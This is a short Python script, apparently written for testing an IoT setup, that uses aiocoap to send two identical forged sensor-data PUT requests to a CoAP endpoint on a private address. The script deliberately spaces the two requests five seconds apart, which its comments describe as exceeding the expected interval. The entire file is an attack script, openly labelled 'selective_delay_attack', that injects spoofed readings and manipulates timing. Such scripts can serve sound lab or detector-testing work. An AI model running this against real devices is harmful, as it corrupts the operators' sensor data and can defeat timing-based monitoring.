import asyncio
from aiocoap import *


async def selective_delay_attack():
    context = await Context.create_client_context()
    uri = "coap://192.168.115.142:5683/sensor/data"
    payload = "A:10,20,30|G:5,5,5|H:75|S:98|S:abc123xyz"

    # Send first packet
    request = Message(code=PUT, uri=uri, payload=payload.encode("utf-8"))
    response = await context.request(request).response
    print(f"First Response: {response.code}")

    # Wait longer than expected interval (e.g., 5 seconds > expected_interval + 2)
    await asyncio.sleep(5)

    # Send second packet
    request = Message(code=PUT, uri=uri, payload=payload.encode("utf-8"))
    response = await context.request(request).response
    print(f"Second Response: {response.code}")


# Run the attack
asyncio.run(selective_delay_attack())
